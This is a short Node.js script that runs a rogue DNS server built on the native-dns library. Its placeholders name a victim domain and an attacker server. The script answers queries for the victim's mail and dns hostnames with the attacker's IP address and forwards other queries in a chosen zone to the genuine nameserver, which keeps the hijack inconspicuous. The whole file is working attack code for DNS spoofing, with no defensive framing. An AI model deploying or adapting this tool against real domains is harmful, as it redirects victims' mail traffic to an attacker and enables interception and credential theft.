var dns = require('native-dns');
var fs = require('fs');



var domainName = ['mail.<victim domain>', 'dns.<victim domain>'];
var zone = 'hostA.example.org';
var authorative = '<original nameserver ip>'; //must be ip
var responseIP = 'attacker server ip';
var server = dns.createServer();

function replaceAll(target, search, replacement) {
	return target.replace(new RegExp(search, 'g'), replacement);
};

server.on('request', function (request, response) {
	for(var i = 0; i < 1; i++)
	{
		var q = request.question[i].name.toLowerCase();
		
		console.log('request = ' + q);
		if(domainName.indexOf(q) > -1 && request.question[i].type == 1)
		{
			response.answer.push(dns.A({
				name: request.question[i].name,
				address: responseIP,
				ttl: 600,
			}));
			response.send();
		}
		else if(q.indexOf(zone) != -1)
		{
			//redirect
			//if(request.question[i].type == 1)
			{
				var question2 = dns.Question(request.question[i]);
				/*question:  dns.Question({
						name: request.question[i].name,
						type: 'A'
					})
					*/
				var req = dns.Request({
					question: question2,
					server: { address: authorative, port: 53, type: 'udp' },
					timeout: 1000,
				});
				req.on('timeout', function () {
					console.log('Timeout in making request');
				});

				req.on('message', function (err, answer) {
					//console.log(JSON.stringify(answer));
					for (var j = answer.answer.length - 1; j >= 0; j--) {
						//console.log(answer.answer[j]);
						//if(answer.answer[j].type == 1)
						{
							response.answer.push(answer.answer[j]);
							/*
							response.answer.push(dns.A({
								name: answer.answer[j].name,
								address: answer.answer[j].address,
								ttl: 600,
							}));
							*/
						}
					}
				});
				req.on('end', function () {
					console.log('Finished processing request');
					response.send();
				});
				console.log('sent ' + request.question[i].name)
				req.send();
			}
			
		} 
		
	}
	/*
	response.answer.push(dns.A({
		name: request.question[0].name,
		address: '127.0.0.2',
		ttl: 600,
	}));
	response.additional.push(dns.A({
		name: 'hostA.example.org',
		address: '127.0.0.3',
		ttl: 600,
	}));
	*/
	
});

server.on('error', function (err, buff, req, res) {
	console.log(err);
});

server.serve(53);
